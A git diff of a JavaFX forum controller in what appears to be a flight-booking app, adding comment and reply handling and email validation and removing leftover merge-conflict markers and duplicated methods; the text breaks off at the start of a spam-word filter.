+        confirmBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #4CAF50; -fx-text-fill: white; -fx-background-radius: 5;");
+
+        Button cancelBtn = new Button("Cancel");
+        cancelBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #f44336; -fx-text-fill: white; -fx-background-radius: 5;");
+
+        HBox replyInputBox = new HBox(10);
+        replyInputBox.setAlignment(Pos.CENTER_LEFT);
+        replyInputBox.setStyle("-fx-padding: 10 0 0 20;");
+        replyInputBox.getChildren().addAll(replyField, confirmBtn, cancelBtn);
+
+        VBox parentContainer = (VBox) parentCommentBox.getParent();
+        int parentIndex = parentContainer.getChildren().indexOf(parentCommentBox);
+
+        parentContainer.getChildren().add(parentIndex + 1, replyInputBox);
+
+        confirmBtn.setOnAction(e -> {
+            String replyContent = replyField.getText().trim();
+            if (replyContent.isEmpty()) {
+                showAlertFP("Error", "Reply cannot be empty", Alert.AlertType.ERROR);
+                return;
+            }
+
+            Comment reply = new Comment(
+                    0,
+                    parentComment.getForumId(),
+                    CurrentUser.getId(),
+                    0,
+                    LocalDateTime.now(),
+                    LocalDateTime.now(),
+                    "",
+                    "active",
+                    0,
+                    replyContent,
+                    parentComment.getPostId()
+            );
+
+            if (containsBadWords(reply)) {
+                showAlertFP("Spam Detected", "Your reply contains inappropriate content. Please revise your reply.", Alert.AlertType.ERROR);
+                return;
+            }
+
+            if (isPostingTooFrequently(reply)) {
+                showAlertFP("Posting Too Frequently", "You are replying too quickly. Please wait a moment before replying again.", Alert.AlertType.ERROR);
+                return;
+            }
+
+            postService.ajouter(reply);
+
+            parentContainer.getChildren().remove(replyInputBox);
+
+            showComments(currentPost);
+        });
+
+        cancelBtn.setOnAction(e -> parentContainer.getChildren().remove(replyInputBox));
+    }
+
+    private void displayReplies(Comment parentComment) {
+
+        List<Comment> replies = postService.rechercher().stream()
+                .filter(p -> p instanceof Comment)
+                .map(p -> (Comment) p)
+                .filter(c -> c.getParentId() == parentComment.getPostId())
+                .toList();
+
+        VBox repliesVBox = new VBox(5);
+        repliesVBox.setStyle("-fx-padding: 10 0 0 20;");
+
+        for (Comment reply : replies) {
+            HBox replyBox = new HBox(10);
+            replyBox.getStyleClass().add("comment-box");
+            replyBox.setStyle("-fx-background-color: rgba(19,42,62,0.8); -fx-background-radius: 10; -fx-padding: 10;");
+
+            HBox topSection = new HBox(10);
+            topSection.setAlignment(Pos.TOP_LEFT);
+
+            HBox buttonsBox = new HBox(5);
+            buttonsBox.setAlignment(Pos.BASELINE_LEFT);
+
+            Button replyBtn = new Button("Répondre");
+            replyBtn.getStyleClass().add("reply-button");
+            replyBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #e78d1e; -fx-text-fill: white; -fx-background-radius: 5;");
+
+            Button editBtn = new Button("Editer");
+            editBtn.getStyleClass().add("edit-button");
+            editBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
+
+            Button deleteBtn = new Button("Supprimer");
+            deleteBtn.getStyleClass().add("delete-button");
+            deleteBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
+
+            replyBtn.setOnAction(e -> showReplyInput(reply, replyBox));
+
+            editBtn.setOnAction(e -> handleEditComment(reply));
+
+            deleteBtn.setOnAction(e -> handleDeleteComment(reply));
+
+            HBox userInfoBox = new HBox(10);
+            userInfoBox.setAlignment(Pos.TOP_RIGHT);
+
+            ImageView userImageView = new ImageView();
+            userImageView.setFitWidth(30);
+            userImageView.setFitHeight(30);
+            userImageView.setPreserveRatio(true);
+            userImageView.setStyle("-fx-effect: dropshadow(gaussian, rgba(0, 0, 0, 0.5), 10, 0, 0, 0); -fx-background-radius: 15;");
+
+            ClientServices clientServices = new ClientServices();
+            String userEmail = forumService.getEmailById(reply.getIdUser());
+            Image userImage = clientServices.loadImageFromDatabase(userEmail);
+            if (userImage != null) {
+                userImageView.setImage(userImage);
+            }
+
+            Label userNameLabel = new Label(forumService.getUserFullNameById(reply.getIdUser()));
+            userNameLabel.setStyle("-fx-text-fill: white; -fx-font-size: 16px;");
+
+            userInfoBox.getChildren().addAll(userImageView, userNameLabel);
+
+            topSection.getChildren().addAll(userInfoBox);
+
+            Label contentLabel = new Label(reply.getCommentContent());
+            contentLabel.setStyle("-fx-text-fill: white; -fx-font-size: 18px; -fx-wrap-text: true;");
+
+            Label dateLabel = new Label(formatDateTime(reply.getDateCreation()).toString());
+            dateLabel.getStyleClass().add("comment-date");
+            dateLabel.setStyle("-fx-text-fill: #cccccc; -fx-font-size: 14px;");
+
+            buttonsBox.getChildren().addAll(replyBtn, editBtn, deleteBtn);
+
+            VBox contentBox = new VBox(5);
+            contentBox.setAlignment(Pos.CENTER_LEFT);
+            contentBox.getChildren().addAll(topSection, contentLabel, dateLabel, buttonsBox);
+
+            replyBox.getChildren().add(contentBox);
+
+            repliesVBox.getChildren().add(replyBox);
+        }
+
+        commentsVBox.getChildren().add(repliesVBox);
     }
 
     private void handleEditComment(Comment comment) {
@@ -5811,9 +5778,46 @@ private TableView<Vol> tableViewVols;
             loadComments();
         }
     }
+    @FXML
+    private void handleAddComment() {
+        if (currentPost == null) return;
 
-//+++++++++++
->>>>>>> Stashed changes
+        String content = newCommentField.getText().trim();
+        if (content.isEmpty()) {
+            showError(newCommentField, commentErrorLabel, "Le commentaire ne peut pas être vide");
+            return;
+        }
+
+        Comment comment = new Comment(
+                0,
+                currentPost.getForumId(),
+                CurrentUser.getId(),
+                0,
+                LocalDateTime.now(),
+                LocalDateTime.now(),
+                "",
+                "active",
+                0,
+                content,
+                currentPost.getPostId()
+        );
+
+        if (containsBadWords(comment)) {
+            showAlertFP("Spam Detected", "Your comment contains inappropriate content. Please revise your comment.", Alert.AlertType.ERROR);
+            return;
+        }
+
+        if (isPostingTooFrequently(comment)) {
+            showAlertFP("Posting Too Frequently", "You are commenting too quickly. Please wait a moment before commenting again.", Alert.AlertType.ERROR);
+            return;
+        }
+
+        postService.ajouter(comment);
+        newCommentField.clear();
+        showComments(currentPost);
+    }
+
+    //+++++++++++
     private void clearSurveyFields() {
         surveyQuestionField.clear();
         surveyTagsField.clear();
@@ -5828,11 +5832,6 @@ private TableView<Vol> tableViewVols;
         announcementTagsField.clear();
     }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-=======
-=======
->>>>>>> Stashed changes
     private void clearFieldsFB() {
 
         announcementTitleField.clear();
@@ -5866,10 +5865,8 @@ private TableView<Vol> tableViewVols;
         announcementFields.setVisible(false);
         surveyFields.setVisible(false);
 
-
         newCommentField.clear();
         commentsVBox.getChildren().clear();
-
 
         clearEditFields();
 
@@ -5904,26 +5901,37 @@ private TableView<Vol> tableViewVols;
         editSurveyFields.setVisible(false);
     }
 
-//+++++++++++
+    //+++++++++++
     private void validateUserEmail(TextField field, Label errorLabel, String email) {
-    if (email.isEmpty()) {
-        field.getStyleClass().remove("valid-field");
-        field.getStyleClass().add("text-field-error");
-        showError(field, errorLabel, "L'email ne peut pas être vide");
-    } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
-        field.getStyleClass().remove("valid-field");
-        field.getStyleClass().add("text-field-error");
-        showError(field, errorLabel, "Format d'email invalide");
-    } else if (forumServiceFP.getUserByEmail(email) == -1) {
-        field.getStyleClass().remove("valid-field");
-        field.getStyleClass().add("text-field-error");
-        showError(field, errorLabel, "Cet utilisateur n'existe pas");
-    } else {
-        field.getStyleClass().remove("text-field-error");
-        field.getStyleClass().add("valid-field");
-        hideError(field, errorLabel);
+        if (email.isEmpty()) {
+            field.getStyleClass().remove("valid-field");
+            field.getStyleClass().add("text-field-error");
+            showError(field, errorLabel, "L'email ne peut pas être vide");
+        } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
+            field.getStyleClass().remove("valid-field");
+            field.getStyleClass().add("text-field-error");
+            showError(field, errorLabel, "Format d'email invalide");
+        } else if (forumServiceFP.getUserByEmail(email) == -1) {
+            field.getStyleClass().remove("valid-field");
+            field.getStyleClass().add("text-field-error");
+            showError(field, errorLabel, "Cet utilisateur n'existe pas");
+        } else {
+            field.getStyleClass().remove("text-field-error");
+            field.getStyleClass().add("valid-field");
+            hideError(field, errorLabel);
+        }
     }
-}
+
+    private boolean validateUserEmail2(String email) {
+        if (email.isEmpty()) {
+            return false;
+        } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
+            return false;
+        } else if (forumServiceFP.getUserByEmail(email) == -1) {
+            return false;
+        }
+        return true;
+    }
 
     private boolean validateImageFile(TextField fileField, Label errorLabel) {
         String filePath = fileField.getText().trim();
@@ -5945,10 +5953,6 @@ private TableView<Vol> tableViewVols;
         return true;
     }
 
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
     private void validateAnnouncementTitle(String title) {
         if (title.isEmpty()) {
             showError(announcementTitleField, titleErrorLabel, "Le titre ne peut pas être vide");
@@ -5969,22 +5973,6 @@ private TableView<Vol> tableViewVols;
         }
     }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-    private void validateSurveyQuestion(String question) {
-        if (question.isEmpty()) {
-            showError(surveyQuestionField, questionErrorLabel, "La question ne peut pas être vide");
-        } else if (question.length() > 200) {
-            showError(surveyQuestionField, questionErrorLabel, "La question ne doit pas dépasser 200 caractères");
-        } else {
-            hideError(surveyQuestionField, questionErrorLabel);
-        }
-    }
-
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
     private void validateTags(String tags, Label errorLabel) {
         TextField field = tags.equals(surveyTagsField.getText()) ? surveyTagsField : announcementTagsField;
 
@@ -6051,11 +6039,6 @@ private TableView<Vol> tableViewVols;
         }
     }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-=======
-=======
->>>>>>> Stashed changes
     private void validateSurveyQuestion(String question) {
         if (question.isEmpty()) {
             showError(surveyQuestionField, questionErrorLabel, "La question ne peut pas être vide");
@@ -6196,15 +6179,11 @@ private TableView<Vol> tableViewVols;
 
         hideError(field, errorLabel);
     }
-//+++++++++++
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
+    //+++++++++++
     private void showError(TextInputControl field, Label errorLabel, String message) {
         if (field != null) {
             field.getStyleClass().removeAll("valid-fieldFP", "text-field-errorFP");
-            field.getStyleClass().addAll("text-fieldFP", "text-field-errorFP"); // Add base class first
+            field.getStyleClass().addAll("text-fieldFP", "text-field-errorFP");
         }
         if (errorLabel != null) {
             errorLabel.getStyleClass().add("error-labelFP");
@@ -6216,139 +6195,14 @@ private TableView<Vol> tableViewVols;
     private void hideError(TextInputControl field, Label errorLabel) {
         if (field != null) {
             field.getStyleClass().removeAll("text-field-errorFP", "valid-fieldFP");
-            field.getStyleClass().addAll("text-fieldFP", "valid-fieldFP"); // Add base class first
+            field.getStyleClass().addAll("text-fieldFP", "valid-fieldFP");
         }
         if (errorLabel != null) {
             errorLabel.setVisible(false);
         }
     }
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-
-=======
-//+++++++++++
->>>>>>> Stashed changes
-    private void showComments(Post post) {
-        currentPost = post;
-
-        leftTabPane.getSelectionModel().select(1);
-
-        showPostDetails(post);
-
-        loadComments();
-    }
-
-    private void loadComments() {
-
-        commentsVBox.getChildren().clear();
-
-        List<Comment> comments = postService.rechercher().stream()
-                .filter(p -> p instanceof Comment)
-                .map(p -> (Comment) p)
-                .filter(c -> c.getParentId() == currentPost.getPostId())
-                .toList();
-
-        for (Comment comment : comments) {
-            displayComment(comment);
-        }
-    }
-
-    private void displayComment(Comment comment) {
-        HBox commentBox = new HBox(10);
-        commentBox.getStyleClass().add("comment-box");
-        commentBox.setStyle("-fx-background-color: rgba(19,42,62,0.8); -fx-background-radius: 10; -fx-padding: 10;");
-
-        VBox contentBox = new VBox(5);
-        contentBox.setAlignment(Pos.CENTER_LEFT);
-
-        // Comment Content
-        Label contentLabel = new Label(comment.getCommentContent());
-        contentLabel.setStyle("-fx-text-fill: white; -fx-font-size: 18px; -fx-wrap-text: true;");
-
-        // Comment Date
-        Label dateLabel = new Label(formatDateTime(comment.getDateCreation()).toString());
-        dateLabel.getStyleClass().add("comment-date");
-        dateLabel.setStyle("-fx-text-fill: #cccccc; -fx-font-size: 14px;");
-
-        contentBox.getChildren().addAll(contentLabel, dateLabel);
-
-        // Buttons (Edit and Delete)
-        HBox buttonsBox = new HBox(5);
-        buttonsBox.setAlignment(Pos.BOTTOM_RIGHT); // Align buttons to bottom right
-
-        Button editBtn = new Button("Editer");
-        editBtn.getStyleClass().add("edit-button");
-        editBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #4444ff; -fx-text-fill: white; -fx-background-radius: 5;");
-
-        Button deleteBtn = new Button("Supprimer");
-        deleteBtn.getStyleClass().add("delete-button");
-        deleteBtn.setStyle("-fx-font-size: 14px; -fx-background-color: #ff4444; -fx-text-fill: white; -fx-background-radius: 5;");
-
-        editBtn.setOnAction(e -> handleEditComment(comment));
-        deleteBtn.setOnAction(e -> handleDeleteComment(comment));
-
-        buttonsBox.getChildren().addAll(editBtn, deleteBtn);
-
-        // Add content and buttons to the comment box
-        commentBox.getChildren().addAll(contentBox, buttonsBox);
-
-        // Add the comment box to the comments container
-        commentsVBox.getChildren().add(commentBox);
-    }
-
-    private void handleEditComment(Comment comment) {
-        TextInputDialog dialog = new TextInputDialog(comment.getCommentContent());
-        dialog.setTitle("Edit Comment");
-        dialog.setHeaderText(null);
-        dialog.setContentText("Enter new comment:");
-
-        dialog.showAndWait().ifPresent(newContent -> {
-            comment.setCommentContent(newContent);
-            postService.modifier(comment);
-            loadComments();
-        });
-    }
-
-    private void handleDeleteComment(Comment comment) {
-        Alert confirm = new Alert(Alert.AlertType.CONFIRMATION);
-        confirm.setTitle("Delete Comment");
-        confirm.setHeaderText("Are you sure you want to delete this comment?");
-        confirm.setContentText("This action cannot be undone.");
-
-        if (confirm.showAndWait().get() == ButtonType.OK) {
-            postService.supprimer(comment);
-            loadComments();
-        }
-    }
-<<<<<<< Updated upstream
-
-    @FXML
-    private void handleViewVoters() {
-        if (currentPost instanceof Survey survey) {
-            Alert alert = new Alert(Alert.AlertType.INFORMATION);
-            alert.setTitle("Survey Voters");
-            alert.setHeaderText("Users who voted in this survey");
-            alert.setContentText(survey.getSurveyUserList());
-            alert.showAndWait();
-        }
-    }
-
-    @FXML
-    private void handleBackButton() {
-        leftTabPane.getSelectionModel().select(0);
-        currentPost = null;
-        newCommentField.clear();
-    }
-
+    //+++++++++++
     private void editPost(Post post) {
-=======
-//+++++++++++
-       private void editPost(Post post) {
->>>>>>> Stashed changes
-=======
-//+++++++++++
-       private void editPost(Post post) {
->>>>>>> Stashed changes
         currentPost = post;
 
         if (post instanceof Announcement announcement) {
@@ -6390,175 +6244,15 @@ private TableView<Vol> tableViewVols;
         }
     }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
     private void handleEditButton(Post post) {
-=======
-       private void handleEditButton(Post post) {
->>>>>>> Stashed changes
-=======
-       private void handleEditButton(Post post) {
->>>>>>> Stashed changes
         currentPost = post;
 
         rightTabPane.getSelectionModel().select(2);
         editPost(post);
-    }
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-    @FXML
-    private void handleBackLeft() {
-        rightTabPane.getSelectionModel().select(0);
+
     }
 
-    @FXML
-    private void handleAddChoice() {
-        String choice = choiceField.getText().trim();
-        if (!choice.isEmpty() && !choicesListView.getItems().contains(choice)) {
-            addRemoveButton(choicesListView, choice);
-            choiceField.clear();
-            addChoiceButton.setDisable(true);
-        }
-    }
-
-    private void addRemoveButton(ListView<String> listView, String itemToRemove) {
-        listView.setCellFactory(lv -> new ListCell<String>() {
-            @Override
-            protected void updateItem(String item, boolean empty) {
-                super.updateItem(item, empty);
-                if (empty || item == null) {
-                    setGraphic(null);
-                } else {
-                    HBox cell = new HBox(10);
-                    Label label = new Label(item);
-                    Button deleteBtn = new Button("Supprimer");
-                    deleteBtn.getStyleClass().add("delete-button");
-                    deleteBtn.setOnAction(e -> listView.getItems().remove(item));
-                    cell.getChildren().addAll(label, deleteBtn);
-                    setGraphic(cell);
-                }
-            }
-        });
-
-        listView.getItems().add(itemToRemove);
-
-        listView.setOnKeyPressed(e -> {
-            if (e.getCode() == KeyCode.DELETE) {
-                String selectedItem = listView.getSelectionModel().getSelectedItem();
-                if (selectedItem != null) {
-                    listView.getItems().remove(selectedItem);
-                }
-            }
-        });
-    }
-
-    @FXML
-    private void handleAddSurveyUser() {
-        String email = surveyUserField.getText().trim();
-        if (!email.isEmpty() && !surveyUsersListView.getItems().contains(email)) {
-            addRemoveButton(surveyUsersListView, email);
-            surveyUserField.clear();
-            addSurveyUserButton.setDisable(true);
-        }
-    }
-
-
-    private void clearFieldsFB() {
-
-        announcementTitleField.clear();
-        announcementContentField.clear();
-        announcementTagsField.clear();
-        announcementFileField.clear();
-        announcementStatusComboBox.setValue("active");
-
-        surveyQuestionField.clear();
-        surveyTagsField.clear();
-        surveyFileField.clear();
-        surveyStatusComboBox.setValue("active");
-        surveyUserField.clear();
-        surveyUsersListView.getItems().clear();
-        choicesListView.getItems().clear();
-        choiceField.clear();
-        addChoiceButton.setDisable(true);
-
-        titleErrorLabel.setVisible(false);
-        contentErrorLabel.setVisible(false);
-        tagsErrorLabel.setVisible(false);
-        questionErrorLabel.setVisible(false);
-        surveyTagsErrorLabel.setVisible(false);
-        commentErrorLabel.setVisible(false);
-        choiceErrorLabel.setVisible(false);
-        surveyUserErrorLabel.setVisible(false);
-        announcementFileErrorLabel.setVisible(false);
-        surveyFileErrorLabel.setVisible(false);
-
-        postTypeComboBox.getSelectionModel().clearSelection();
-        announcementFields.setVisible(false);
-        surveyFields.setVisible(false);
-
-
-        newCommentField.clear();
-        commentsVBox.getChildren().clear();
-
-
-        clearEditFields();
-
-        announcementUserField.clear();
-        surveyAuthorField.clear();
-        editAnnouncementUserField.clear();
-        editSurveyAuthorField.clear();
-
-        announcementUserErrorLabel.setVisible(false);
-        surveyAuthorErrorLabel.setVisible(false);
-        editAnnouncementUserErrorLabel.setVisible(false);
-        editSurveyAuthorErrorLabel.setVisible(false);
-    }
-
-    @FXML
-    private void handleBrowseFile(ActionEvent event) {
-        FileChooser fileChooser = new FileChooser();
-        fileChooser.setTitle("Select File");
-        File file = fileChooser.showOpenDialog(null);
-        if (file != null) {
-
-            Button button = (Button) event.getSource();
-
-            HBox hbox = (HBox) button.getParent();
-
-            TextField fileField = (TextField) hbox.getChildren().get(0);
-            fileField.setText(file.getAbsolutePath());
-        }
-    }
-
-    private void validateSurveyUser(String email) {
-        if (email.isEmpty()) {
-            addSurveyUserButton.setDisable(true);
-            showError(surveyUserField, surveyUserErrorLabel, "L'email ne peut pas être vide");
-        } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
-            addSurveyUserButton.setDisable(true);
-            showError(surveyUserField, surveyUserErrorLabel, "Format d'email invalide");
-        } else if (forumServiceFP.getUserByEmail(email) == -1) {
-            addSurveyUserButton.setDisable(true);
-            showError(surveyUserField, surveyUserErrorLabel, "Cet utilisateur n'existe pas");
-        } else if (surveyUsersListView.getItems().contains(email)) {
-            addSurveyUserButton.setDisable(true);
-            showError(surveyUserField, surveyUserErrorLabel, "Cet utilisateur est déjà dans la liste");
-        } else {
-            hideError(surveyUserField, surveyUserErrorLabel);
-            addSurveyUserButton.setDisable(false);
-        }
-    }
-
-    @FXML
-    private void handleDeletePost() {
-=======
-
-       private void handleDeletePost(Post post) {
->>>>>>> Stashed changes
-=======
-
-       private void handleDeletePost(Post post) {
->>>>>>> Stashed changes
+    private void handleDeletePost(Post post) {
         if (currentPost == null) return;
 
         Alert confirm = new Alert(Alert.AlertType.CONFIRMATION);
@@ -6572,38 +6266,7 @@ private TableView<Vol> tableViewVols;
         }
     }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-    private String formatDateTime(LocalDateTime dateTime) {
-        return dateTime.toString().replace("T", " ");
-    }
-
-    @FXML
-    private void handleAddEditChoice() {
-        String choice = editChoiceField.getText().trim();
-        if (!choice.isEmpty() && !editChoicesListView.getItems().contains(choice)) {
-            addRemoveButton(editChoicesListView, choice);
-            editChoiceField.clear();
-            editAddChoiceButton.setDisable(true);
-        }
-    }
-
-    @FXML
-    private void handleAddEditSurveyUser() {
-        String email = editSurveyUserField.getText().trim();
-        if (!email.isEmpty() && !editSurveyUsersListView.getItems().contains(email)) {
-            addRemoveButton(editSurveyUsersListView, email);
-            editSurveyUserField.clear();
-            editAddSurveyUserButton.setDisable(true);
-        }
-    }
-
-    @FXML
-    private void handleUpdatePost(ActionEvent actionEvent) {
-=======
-=======
->>>>>>> Stashed changes
- @FXML private void handleDeletePost() {
+    @FXML private void handleDeletePost() {
         if (currentPost == null) return;
 
         Alert confirm = new Alert(Alert.AlertType.CONFIRMATION);
@@ -6617,11 +6280,7 @@ private TableView<Vol> tableViewVols;
         }
     }
 
- @FXML private void handleUpdatePost() {
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
+    @FXML private void handleUpdatePost() {
         if (currentPost == null) return;
 
         if (currentPost instanceof Announcement announcement) {
@@ -6728,114 +6387,7 @@ private TableView<Vol> tableViewVols;
             }
         }
     }
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-    private void clearEditFields() {
-        editAnnouncementTitleField.clear();
-        editAnnouncementContentField.clear();
-        editAnnouncementTagsField.clear();
-        editAnnouncementFileField.clear();
-        editAnnouncementStatusComboBox.setValue("active");
-
-        editSurveyQuestionField.clear();
-        editSurveyTagsField.clear();
-        editChoiceField.clear();
-        editChoicesListView.getItems().clear();
-        editSurveyFileField.clear();
-        editSurveyStatusComboBox.setValue("active");
-        editSurveyUserField.clear();
-        editSurveyUsersListView.getItems().clear();
-
-        editAnnouncementFields.setVisible(false);
-        editSurveyFields.setVisible(false);
-    }
-
-    @FXML
-    private void handleBrowseAnnouncementFile(ActionEvent actionEvent) {
-        handleBrowseFile(actionEvent);
-    }
-
-    @FXML
-    private void handleBrowseSurveyFile(ActionEvent actionEvent) {
-        handleBrowseFile(actionEvent);
-    }
-
-    private void validateEditChoice(String choice) {
-        if (choice.isEmpty()) {
-            editChoiceField.getStyleClass().remove("valid-field");
-            editChoiceField.getStyleClass().add("text-field-error");
-            editAddChoiceButton.setDisable(true);
-            showError(editChoiceField, editChoiceErrorLabel, "Le choix ne peut pas être vide");
-        } else if (choice.length() > 50) {
-            editChoiceField.getStyleClass().remove("valid-field");
-            editChoiceField.getStyleClass().add("text-field-error");
-            editAddChoiceButton.setDisable(true);
-            showError(editChoiceField, editChoiceErrorLabel, "Le choix ne doit pas dépasser 50 caractères");
-        } else if (editChoicesListView.getItems().contains(choice)) {
-            editChoiceField.getStyleClass().remove("valid-field");
-            editChoiceField.getStyleClass().add("text-field-error");
-            editAddChoiceButton.setDisable(true);
-            showError(editChoiceField, editChoiceErrorLabel, "Ce choix existe déjà");
-        } else {
-            editChoiceField.getStyleClass().remove("text-field-error");
-            editChoiceField.getStyleClass().add("valid-field");
-            hideError(editChoiceField, editChoiceErrorLabel);
-            editAddChoiceButton.setDisable(false);
-        }
-    }
-
-    private void validateEditSurveyUser(String email) {
-        if (email.isEmpty()) {
-            editAddSurveyUserButton.setDisable(true);
-            showError(editSurveyUserField, editSurveyUserErrorLabel, "L'email ne peut pas être vide");
-        } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
-            editAddSurveyUserButton.setDisable(true);
-            showError(editSurveyUserField, editSurveyUserErrorLabel, "Format d'email invalide");
-        } else if (forumServiceFP.getUserByEmail(email) == -1) {
-            editAddSurveyUserButton.setDisable(true);
-            showError(editSurveyUserField, editSurveyUserErrorLabel, "Cet utilisateur n'existe pas");
-        } else if (editSurveyUsersListView.getItems().contains(email)) {
-            editAddSurveyUserButton.setDisable(true);
-            showError(editSurveyUserField, editSurveyUserErrorLabel, "Cet utilisateur est déjà dans la liste");
-        } else {
-            hideError(editSurveyUserField, editSurveyUserErrorLabel);
-            editAddSurveyUserButton.setDisable(false);
-        }
-    }
-
-    private void validateEditTitle(String title) {
-        if (title.isEmpty()) {
-            showError(editAnnouncementTitleField, editTitleErrorLabel, "Le titre ne peut pas être vide");
-        } else if (title.length() > 50) {
-            showError(editAnnouncementTitleField, editTitleErrorLabel, "Le titre ne doit pas dépasser 50 caractères");
-        } else {
-            hideError(editAnnouncementTitleField, editTitleErrorLabel);
-        }
-    }
-
-    private void validateEditContent(String content) {
-        if (content.isEmpty()) {
-            showError(editAnnouncementContentField, editContentErrorLabel, "Le contenu ne peut pas être vide");
-        } else if (content.length() > 500) {
-            showError(editAnnouncementContentField, editContentErrorLabel, "Le contenu ne doit pas dépasser 500 caractères");
-        } else {
-            hideError(editAnnouncementContentField, editContentErrorLabel);
-        }
-    }
-
-    private void validateEditQuestion(String question) {
-        if (question.isEmpty()) {
-            showError(editSurveyQuestionField, editSurveyQuestionErrorLabel, "La question ne peut pas être vide");
-        } else if (question.length() > 200) {
-            showError(editSurveyQuestionField, editSurveyQuestionErrorLabel, "La question ne doit pas dépasser 200 caractères");
-        } else {
-            hideError(editSurveyQuestionField, editSurveyQuestionErrorLabel);
-        }
-    }
-=======
-=======
->>>>>>> Stashed changes
-//+++++++++++
+    //+++++++++++
     @FXML
     private void handleBackButton() {
         leftTabPane.getSelectionModel().select(0);
@@ -6853,15 +6405,12 @@ private TableView<Vol> tableViewVols;
         rightTabPane.getSelectionModel().select(1);
         postTypeComboBox.getSelectionModel().select(0);
         handlePostTypeChange();
+        announcementUserField.setText(CurrentUser.getEmail());
     }
-//+++++++++++
+    //+++++++++++
     private String formatDateTime(LocalDateTime dateTime) {
-    return dateTime.toString().replace("T", " ");
-}
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
+        return dateTime.toString().replace("T", " ");
+    }
 
     private void handleVote(Post post, boolean isUpvote) {
         if (isUpvote) {
@@ -6885,53 +6434,6 @@ private TableView<Vol> tableViewVols;
         alert.showAndWait();
     }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-    private void validateUserEmail(TextField field, Label errorLabel, String email) {
-        if (email.isEmpty()) {
-            field.getStyleClass().remove("valid-field");
-            field.getStyleClass().add("text-field-error");
-            showError(field, errorLabel, "L'email ne peut pas être vide");
-        } else if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
-            field.getStyleClass().remove("valid-field");
-            field.getStyleClass().add("text-field-error");
-            showError(field, errorLabel, "Format d'email invalide");
-        } else if (forumServiceFP.getUserByEmail(email) == -1) {
-            field.getStyleClass().remove("valid-field");
-            field.getStyleClass().add("text-field-error");
-            showError(field, errorLabel, "Cet utilisateur n'existe pas");
-        } else {
-            field.getStyleClass().remove("text-field-error");
-            field.getStyleClass().add("valid-field");
-            hideError(field, errorLabel);
-        }
-    }
-
-    @FXML
-    private void handleAddPostButton() {
-        rightTabPane.getSelectionModel().select(1);
-        postTypeComboBox.getSelectionModel().select(0);
-        handlePostTypeChange();
-    }
-
-    private void handleDeletePost(Post post) {
-        if (currentPost == null) return;
-
-        Alert confirm = new Alert(Alert.AlertType.CONFIRMATION);
-        confirm.setTitle("Delete Post");
-        confirm.setHeaderText("Are you sure you want to delete this post?");
-        confirm.setContentText("This action cannot be undone.");
-
-        if (confirm.showAndWait().get() == ButtonType.OK) {
-            postService.supprimer(currentPost);
-            refreshPosts();
-        }
-    }
-
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
     private void handleChoiceVote(Choix choice) {
         choice.setChoiceVotesCount(choice.getChoiceVotesCount() + 1);
         choixService.modifier(choice);
@@ -6942,51 +6444,6 @@ private TableView<Vol> tableViewVols;
         }
     }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-    private void validateEditTags(String tags, Label errorLabel) {
-        TextField field = tags.equals(editSurveyTagsField.getText()) ? editSurveyTagsField : editAnnouncementTagsField;
-
-        if (tags.length() > 100) {
-            showError(field, errorLabel, "Les tags ne doivent pas dépasser 100 caractères");
-            return;
-        }
-
-        if (!tags.isEmpty()) {
-            if (!tags.matches("^[a-zA-Z0-9,\\s]+$")) {
-                showError(field, errorLabel, "Les tags ne doivent contenir que des lettres, chiffres et virgules");
-                return;
-            }
-
-            String[] tagArray = tags.split(",");
-            Set<String> uniqueTags = new HashSet<>();
-
-            for (String tag : tagArray) {
-                String trimmedTag = tag.trim();
-                if (!trimmedTag.isEmpty()) {
-                    if (!uniqueTags.add(trimmedTag)) {
-                        showError(field, errorLabel, "Tag '" + trimmedTag + "' est en double");
-                        return;
-                    }
-                }
-            }
-
-            for (String tag : tagArray) {
-                String trimmedTag = tag.trim();
-                if (trimmedTag.length() > 20) {
-                    showError(field, errorLabel, "Chaque tag ne doit pas dépasser 20 caractères");
-                    return;
-                }
-            }
-        }
-
-        hideError(field, errorLabel);
-    }
-
-    //NewForumNajd
-=======
-=======
->>>>>>> Stashed changes
     private void addRemoveButton(ListView<String> listView, String itemToRemove) {
         listView.setCellFactory(lv -> new ListCell<String>() {
             @Override
@@ -7017,7 +6474,7 @@ private TableView<Vol> tableViewVols;
             }
         });
     }
-//+++++++++++
+    //+++++++++++
     @FXML
     private void handleAddChoice() {
         String choice = choiceField.getText().trim();
@@ -7095,15 +6552,10 @@ private TableView<Vol> tableViewVols;
 
 
 
-
 //****** New ForumNajdAvance
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
 
     private boolean containsBadWords(Post post) {
-        // List of bad words (spam keywords)
+
         List<String> badWords = Arrays.asList(
